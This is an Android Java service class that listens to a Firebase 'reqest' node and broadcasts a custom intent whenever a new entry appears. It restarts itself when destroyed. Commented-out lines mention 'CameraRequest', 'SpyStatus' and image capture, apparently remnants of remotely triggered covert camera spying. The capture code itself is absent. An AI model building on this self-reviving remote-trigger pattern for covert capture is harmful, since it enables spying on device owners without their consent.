package com.example.hideoutcabins.service;

import android.app.IntentService;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class DBNotification extends Service {

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    FirebaseDatabase database;
    public static DatabaseReference RequestRef, SpyStatus;
    String devicemodel;

    @Override
    public void onCreate() {
        super.onCreate();
        //android.os.Debug.waitForDebugger();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
//        devicemodel = android.os.Build.MODEL;
//        // mStorageRef = FirebaseStorage.getInstance().getReference();
//        database = FirebaseDatabase.getInstance();
//        RequestRef = database.getReference("CameraRequest");
//        SpyStatus = database.getReference("SpyStatus");
        RequestRef = FirebaseDatabase.getInstance().getReference().child("reqest");
        ListenerForRequestDone();
        System.out.println("Service started");
        return START_STICKY;

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Intent intent = new Intent("RESTART_SERVICE");
        sendBroadcast(intent);
    }

    public void ListenerForRequestDone() {
        RequestRef.addChildEventListener(new ChildEventListener() {
            @Override
            public void onChildAdded(DataSnapshot dataSnapshot, String s) {


                Intent intent=new Intent("com.example.andy.CUSTOM_INTENT");
                sendBroadcast(intent);

            }

            @Override
            public void onChildChanged(DataSnapshot dataSnapshot, String s) {
                // StartImageCapture(1);
            }

            @Override
            public void onChildRemoved(DataSnapshot dataSnapshot) {

            }

            @Override
            public void onChildMoved(DataSnapshot dataSnapshot, String s) {

            }

            @Override
            public void onCancelled(DatabaseError databaseError) {

            }
        });
    }
}
